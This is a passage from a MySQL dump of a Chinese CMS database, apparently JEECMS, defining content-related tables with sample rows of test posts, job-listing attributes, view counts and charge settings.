  INDEX `index_jc_content_is_recommend`(`is_recommend`) USING BTREE,
  INDEX `index_jc_content_recommend_level`(`recommend_level`) USING BTREE,
  CONSTRAINT `fk_jc_contentchannel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_content_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_content_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_content_type` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_content_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 59 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content
-- ----------------------------
INSERT INTO `jc_content` VALUES (47, 79, 1, 1, 8, 1, '2016-09-26 09:47:54', 1, 0, 0, 2, 0, 0, 0, 0, 0, 1);
INSERT INTO `jc_content` VALUES (48, 94, 1, 1, 9, 1, '2019-01-25 14:43:20', 1, 0, 1, 2, 0, 0, 0, 0, 0, 2);
INSERT INTO `jc_content` VALUES (49, 75, 1, 2, 1, 1, '2019-01-25 17:17:13', 1, 0, 1, 2, 11, 0, 0, 0, 1, 1);
INSERT INTO `jc_content` VALUES (50, 76, 1, 1, 5, 1, '2019-01-25 17:19:33', 1, 0, 0, 2, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content` VALUES (51, 76, 1, 2, 5, 1, '2019-01-25 17:29:50', 1, 0, 0, 2, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content` VALUES (52, 76, 1, 2, 5, 1, '2019-01-25 17:31:30', 1, 0, 0, 2, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content` VALUES (53, 77, 1, 2, 6, 1, '2019-01-28 10:16:59', 1, 1, 1, 2, 0, 0, 0, 0, 0, 1);
INSERT INTO `jc_content` VALUES (54, 92, 1, 1, 4, 1, '2019-01-28 10:20:42', 0, 0, 0, 3, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content` VALUES (55, 92, 1, 1, 4, 1, '2019-01-28 10:20:43', 0, 0, 0, 3, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content` VALUES (56, 92, 1, 1, 4, 1, '2019-01-28 10:20:45', 1, 0, 0, 2, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content` VALUES (57, 75, 1, 2, 1, 1, '2019-01-28 16:42:00', 0, 0, 1, 0, 0, 0, 0, 0, 0, 2);
INSERT INTO `jc_content` VALUES (58, 75, 1, 2, 1, 1, '2019-01-28 16:42:02', 0, 0, 1, 2, 1, 0, 0, 0, 0, 2);

-- ----------------------------
-- Table structure for jc_content_attachment
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_attachment`;
CREATE TABLE `jc_content_attachment`  (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `attachment_path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '附件路径',
  `attachment_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '附件名称',
  `filename` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文件名',
  `download_count` int(11) NOT NULL DEFAULT 0 COMMENT '下载次数',
  INDEX `fk_jc_attachment_content`(`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_attachment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容附件表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_attachment
-- ----------------------------
INSERT INTO `jc_content_attachment` VALUES (56, 0, '/menhu/u/cms/www/201901/28102129uaav.jpg', '296cc8d725829e5cbe238995fdaa0dfe.jpg', '296cc8d725829e5cbe238995fdaa0dfe.jpg', 0);
INSERT INTO `jc_content_attachment` VALUES (49, 0, '/menhu/u/cms/www/201901/28164821u2hi.jpg', 'c1595e21fcdfc331369c5f8111bb62a4.jpg', 'c1595e21fcdfc331369c5f8111bb62a4.jpg', 0);
INSERT INTO `jc_content_attachment` VALUES (49, 1, '/menhu/u/cms/www/201901/28164821nelv.jpg', 'b28bc88b6e4913ce6a9df9c19216daf5.jpg', 'b28bc88b6e4913ce6a9df9c19216daf5.jpg', 0);

-- ----------------------------
-- Table structure for jc_content_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_attr`;
CREATE TABLE `jc_content_attr`  (
  `content_id` int(11) NOT NULL,
  `attr_name` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `attr_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '值',
  INDEX `fk_jc_attr_content`(`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_attr_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容扩展属性表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_attr
-- ----------------------------
INSERT INTO `jc_content_attr` VALUES (47, 'education', '专科');
INSERT INTO `jc_content_attr` VALUES (47, 'nature', '全职');
INSERT INTO `jc_content_attr` VALUES (47, 'hasmanage', '不要求');
INSERT INTO `jc_content_attr` VALUES (47, 'deadline', '');
INSERT INTO `jc_content_attr` VALUES (47, 'experience', '1-3年');
INSERT INTO `jc_content_attr` VALUES (47, 'salary', '1500-2000');
INSERT INTO `jc_content_attr` VALUES (47, 'category', '项目主管');
INSERT INTO `jc_content_attr` VALUES (47, 'workplace', '重庆');
INSERT INTO `jc_content_attr` VALUES (47, 'nums', '1-3人');
INSERT INTO `jc_content_attr` VALUES (48, 'interviewContent', '435435345345');
INSERT INTO `jc_content_attr` VALUES (48, 'interviewTime', '2019-01-09');
INSERT INTO `jc_content_attr` VALUES (48, 'interviewUser', '王二虎');
INSERT INTO `jc_content_attr` VALUES (53, 'VideoType', '');
INSERT INTO `jc_content_attr` VALUES (53, 'Starring', 'xl');
INSERT INTO `jc_content_attr` VALUES (53, 'Video', '');
INSERT INTO `jc_content_attr` VALUES (53, 'Director', 'xl');
INSERT INTO `jc_content_attr` VALUES (54, 'demoUrl', 'http://');
INSERT INTO `jc_content_attr` VALUES (54, 'warrant', '免费版');
INSERT INTO `jc_content_attr` VALUES (54, 'relatedLink', 'http://');
INSERT INTO `jc_content_attr` VALUES (54, 'bit', '');
INSERT INTO `jc_content_attr` VALUES (54, 'edition', '');
INSERT INTO `jc_content_attr` VALUES (54, 'system', '');
INSERT INTO `jc_content_attr` VALUES (54, 'softType', '国产软件');
INSERT INTO `jc_content_attr` VALUES (54, 'size', '');
INSERT INTO `jc_content_attr` VALUES (55, 'demoUrl', 'http://');
INSERT INTO `jc_content_attr` VALUES (55, 'warrant', '免费版');
INSERT INTO `jc_content_attr` VALUES (55, 'relatedLink', 'http://');
INSERT INTO `jc_content_attr` VALUES (55, 'bit', '');
INSERT INTO `jc_content_attr` VALUES (55, 'edition', '');
INSERT INTO `jc_content_attr` VALUES (55, 'system', '');
INSERT INTO `jc_content_attr` VALUES (55, 'softType', '国产软件');
INSERT INTO `jc_content_attr` VALUES (55, 'size', '');
INSERT INTO `jc_content_attr` VALUES (56, 'demoUrl', 'http://');
INSERT INTO `jc_content_attr` VALUES (56, 'warrant', '免费版');
INSERT INTO `jc_content_attr` VALUES (56, 'relatedLink', 'http://');
INSERT INTO `jc_content_attr` VALUES (56, 'bit', '');
INSERT INTO `jc_content_attr` VALUES (56, 'edition', '');
INSERT INTO `jc_content_attr` VALUES (56, 'system', '');
INSERT INTO `jc_content_attr` VALUES (56, 'softType', '国产软件');
INSERT INTO `jc_content_attr` VALUES (56, 'size', '');

-- ----------------------------
-- Table structure for jc_content_buy
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_buy`;
CREATE TABLE `jc_content_buy`  (
  `content_buy_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `order_number` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '订单号',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `buy_user_id` int(11) NULL DEFAULT NULL COMMENT '购买用户ID',
  `author_user_id` int(11) NOT NULL COMMENT '笔者ID',
  `charge_amount` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '成交金额',
  `author_amount` double(11, 4) NOT NULL DEFAULT 0.0000 COMMENT '笔者所得',
  `plat_amount` double(11, 4) NOT NULL DEFAULT 0.0000 COMMENT '平台所得',
  `buy_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '成交时间',
  `has_paid_author` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否已经结算给作者(0未结算 1已经结算)',
  `order_num_weixin` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信支付订单号',
  `order_num_alipay` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝订单号',
  `charge_reward` tinyint(1) NOT NULL DEFAULT 1 COMMENT '模式 1收费 2打赏',
  PRIMARY KEY (`content_buy_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '收费文章购买记录' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_content_channel
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_channel`;
CREATE TABLE `jc_content_channel`  (
  `channel_id` int(11) NOT NULL,
  `content_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`, `content_id`) USING BTREE,
  INDEX `fk_jc_channel_content`(`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_channel_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_content_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容栏目关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_channel
-- ----------------------------
INSERT INTO `jc_content_channel` VALUES (79, 47);
INSERT INTO `jc_content_channel` VALUES (94, 48);
INSERT INTO `jc_content_channel` VALUES (75, 49);
INSERT INTO `jc_content_channel` VALUES (76, 50);
INSERT INTO `jc_content_channel` VALUES (76, 51);
INSERT INTO `jc_content_channel` VALUES (76, 52);
INSERT INTO `jc_content_channel` VALUES (77, 53);
INSERT INTO `jc_content_channel` VALUES (92, 54);
INSERT INTO `jc_content_channel` VALUES (92, 55);
INSERT INTO `jc_content_channel` VALUES (92, 56);
INSERT INTO `jc_content_channel` VALUES (75, 57);
INSERT INTO `jc_content_channel` VALUES (75, 58);

-- ----------------------------
-- Table structure for jc_content_charge
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_charge`;
CREATE TABLE `jc_content_charge`  (
  `content_id` int(11) NOT NULL DEFAULT 0,
  `charge_amount` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '收费金额',
  `total_amount` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '已累计收费',
  `year_amount` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '年金额',
  `month_amount` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '月金额',
  `day_amount` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `charge_reward` tinyint(1) NOT NULL DEFAULT 0 COMMENT '模式，1收费 2打赏',
  `reward_random_min` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '随机 最小值',
  `reward_random_max` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '随机 最大值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT 0 COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`content_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '收费内容配置' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_charge
-- ----------------------------
INSERT INTO `jc_content_charge` VALUES (48, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (49, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (50, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (51, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (52, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (53, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (54, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (55, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (56, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (57, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);
INSERT INTO `jc_content_charge` VALUES (58, 0.00, 0.00, 0.00, 0.00, 0.00, NULL, 0, 0.00, 10.00, 0);

-- ----------------------------
-- Table structure for jc_content_check
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_check`;
CREATE TABLE `jc_content_check`  (
  `content_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT 0 COMMENT '审核步数',
  `check_opinion` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '审核意见',
  `is_rejected` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否退回',
  `reviewer` int(11) NULL DEFAULT NULL COMMENT '终审者',
  `check_date` datetime NULL DEFAULT NULL COMMENT '终审时间',
  PRIMARY KEY (`content_id`) USING BTREE,
  INDEX `fk_jc_content_check_user`(`reviewer`) USING BTREE,
  CONSTRAINT `fk_jc_check_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_content_check_user` FOREIGN KEY (`reviewer`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容审核信息表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_check
-- ----------------------------
INSERT INTO `jc_content_check` VALUES (47, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (48, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (49, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (50, 3, NULL, 0, 1, '2019-01-28 16:33:25');
INSERT INTO `jc_content_check` VALUES (51, 3, NULL, 0, 1, '2019-01-28 16:33:25');
INSERT INTO `jc_content_check` VALUES (52, 3, NULL, 0, 1, '2019-01-28 16:33:25');
INSERT INTO `jc_content_check` VALUES (53, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (54, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (55, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (56, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (57, 3, NULL, 0, NULL, NULL);
INSERT INTO `jc_content_check` VALUES (58, 3, NULL, 0, NULL, NULL);

-- ----------------------------
-- Table structure for jc_content_count
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_count`;
CREATE TABLE `jc_content_count`  (
  `content_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT 0 COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT 0 COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT 0 COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT 0 COMMENT '日访问数',
  `comments` int(11) NOT NULL DEFAULT 0 COMMENT '总评论数',
  `comments_month` int(11) NOT NULL DEFAULT 0 COMMENT '月评论数',
  `comments_week` smallint(6) NOT NULL DEFAULT 0 COMMENT '周评论数',
  `comments_day` smallint(6) NOT NULL DEFAULT 0 COMMENT '日评论数',
  `downloads` int(11) NOT NULL DEFAULT 0 COMMENT '总下载数',
  `downloads_month` int(11) NOT NULL DEFAULT 0 COMMENT '月下载数',
  `downloads_week` smallint(6) NOT NULL DEFAULT 0 COMMENT '周下载数',
  `downloads_day` smallint(6) NOT NULL DEFAULT 0 COMMENT '日下载数',
  `ups` int(11) NOT NULL DEFAULT 0 COMMENT '总顶数',
  `ups_month` int(11) NOT NULL DEFAULT 0 COMMENT '月顶数',
  `ups_week` smallint(6) NOT NULL DEFAULT 0 COMMENT '周顶数',
  `ups_day` smallint(6) NOT NULL DEFAULT 0 COMMENT '日顶数',
  `downs` int(11) NOT NULL DEFAULT 0 COMMENT '总踩数',
  PRIMARY KEY (`content_id`) USING BTREE,
  INDEX `index_jc_content_count_views_day`(`views_day`) USING BTREE,
  INDEX `index_jc_content_count_views_week`(`views_week`) USING BTREE,
  INDEX `index_jc_content_count_views_month`(`views_month`) USING BTREE,
  INDEX `index_jc_content_count_views`(`views`) USING BTREE,
  INDEX `index_jc_content_count_comments_day`(`comments_day`) USING BTREE,
  INDEX `index_jc_content_count_comments_month`(`comments_month`) USING BTREE,
  INDEX `index_jc_content_count_comments_week`(`comments_week`) USING BTREE,
  INDEX `index_jc_content_count_comments`(`comments`) USING BTREE,
  INDEX `index_jc_content_count_downloads_day`(`downloads_day`) USING BTREE,
  INDEX `index_jc_content_count_downloads_month`(`downloads_month`) USING BTREE,
  INDEX `index_jc_content_count_downloads_week`(`downloads_week`) USING BTREE,
  INDEX `index_jc_content_count_downloads`(`downloads`) USING BTREE,
  INDEX `index_jc_content_count_ups_day`(`ups_day`) USING BTREE,
  INDEX `index_jc_content_count_ups_week`(`ups_week`) USING BTREE,
  INDEX `index_jc_content_count_ups_month`(`ups_month`) USING BTREE,
  INDEX `index_jc_content_count_ups`(`ups`) USING BTREE,
  CONSTRAINT `fk_jc_count_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容计数表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_count
-- ----------------------------
INSERT INTO `jc_content_count` VALUES (47, 23, 23, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (48, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (49, 23, 23, 22, 11, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (50, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (51, 2, 2, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (52, 5, 5, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (53, 7, 7, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (54, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (56, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (57, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_content_count` VALUES (58, 4, 4, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1);

-- ----------------------------
-- Table structure for jc_content_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_ext`;
CREATE TABLE `jc_content_ext`  (
  `content_id` int(11) NOT NULL,
  `title` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '标题',
  `short_title` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '简短标题',
  `author` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '作者',
  `origin` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '来源',
  `origin_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '来源链接',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `release_date` datetime NOT NULL COMMENT '发布日期',
  `media_path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '媒体路径',
  `media_type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '媒体类型',
  `title_color` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题颜色',
  `is_bold` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否加粗',
  `title_img` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题图片',
  `content_img` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容图片',
  `type_img` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '类型图片',
  `link` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '外部链接',
  `tpl_content` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '指定模板',
  `need_regenerate` tinyint(1) NOT NULL DEFAULT 1 COMMENT '需要重新生成静态页',
  `tpl_mobile_content` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '手机内容页模板',
  `toplevel_date` datetime NULL DEFAULT NULL COMMENT '固顶到期日期',
  `pigeonhole_date` datetime NULL DEFAULT NULL COMMENT '归档日期',
  PRIMARY KEY (`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_ext_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容扩展表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_content_ext
-- ----------------------------
INSERT INTO `jc_content_ext` VALUES (47, '3k计算机实习生双休', NULL, NULL, NULL, NULL, NULL, '2016-09-26 09:47:54', NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (48, '阿里巴巴招生啦啦啦', NULL, NULL, NULL, NULL, NULL, '2019-01-25 14:43:20', NULL, 'CK', NULL, 0, NULL, NULL, NULL, NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (49, '黄金接连下跌难道又等大妈来托盘', '黄金接连下跌难道又等大妈来托盘', NULL, NULL, NULL, NULL, '2019-01-25 17:17:13', NULL, 'CK', NULL, 0, NULL, NULL, '/menhu/u/cms/www/201901/28164814fuhz.jpg', NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (50, '中国空军航空兵赴南海常态化战斗巡航', '中国空军航空兵赴南海常态化战斗巡航', NULL, NULL, NULL, NULL, '2019-01-25 17:19:33', NULL, 'CK', NULL, 0, NULL, NULL, NULL, NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (51, '宛如置身黑客帝国 “啤酒丛林”惊艳...', NULL, NULL, NULL, NULL, NULL, '2019-01-25 17:29:50', NULL, 'CK', NULL, 0, NULL, NULL, '/menhu/u/cms/www/201901/28165912drrn.jpg', NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (52, ' 登录  |  注册 摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕', NULL, NULL, NULL, NULL, NULL, '2019-01-25 17:31:30', NULL, 'CK', NULL, 0, NULL, NULL, '/menhu/u/cms/www/201901/28164556n46x.jpg', NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (53, '美女云集只为等你', '美女云集', 'xln', '新浪', NULL, '这是个美女视频介绍', '2019-01-28 10:16:59', '/menhu/u/cms/www/201901/28101655lr8q.mp4', 'CK', '#00FF59', 0, '/menhu/u/cms/www/201901/28164404upc1.jpg', NULL, '/menhu/u/cms/www/201901/281644003dax.jpg', NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (54, '111', '11', '11', NULL, NULL, '11', '2019-01-28 10:20:42', NULL, 'CK', NULL, 0, NULL, NULL, NULL, NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (55, '111', '11', '11', NULL, NULL, '11', '2019-01-28 10:20:43', NULL, 'CK', NULL, 0, NULL, NULL, NULL, NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (56, '111', '11', '11', NULL, NULL, '11', '2019-01-28 10:20:45', NULL, 'CK', NULL, 0, NULL, NULL, NULL, NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (57, '“一带一路”：习近平打开的“筑梦空间”', NULL, NULL, NULL, NULL, '【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”', '2019-01-28 16:42:00', NULL, 'CK', NULL, 0, NULL, NULL, '/menhu/u/cms/www/201901/28164129k2xw.jpg', NULL, NULL, 1, '', NULL, NULL);
INSERT INTO `jc_content_ext` VALUES (58, '“一带一路”：习近平打开的“筑梦空间”', NULL, NULL, NULL, NULL, '【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”', '2019-01-28 16:42:02', NULL, 'CK', NULL, 0, NULL, NULL, '/menhu/u/cms/www/201901/28164129k2xw.jpg', NULL, NULL, 1, '', NULL, NULL);

-- ----------------------------
-- Table structure for jc_content_group_view
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_group_view`;
CREATE TABLE `jc_content_group_view`  (
  `content_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`, `group_id`) USING BTREE,
  INDEX `fk_jc_content_group_v`(`group_id`) USING BTREE,
  CONSTRAINT `fk_jc_content_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_group_content_v` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容浏览会员组关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_content_picture
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_picture`;
CREATE TABLE `jc_content_picture`  (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `img_path` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '图片地址',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`content_id`, `priority`) USING BTREE,
  CONSTRAINT `fk_jc_picture_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容图片表' ROW_FORMAT = Compact;

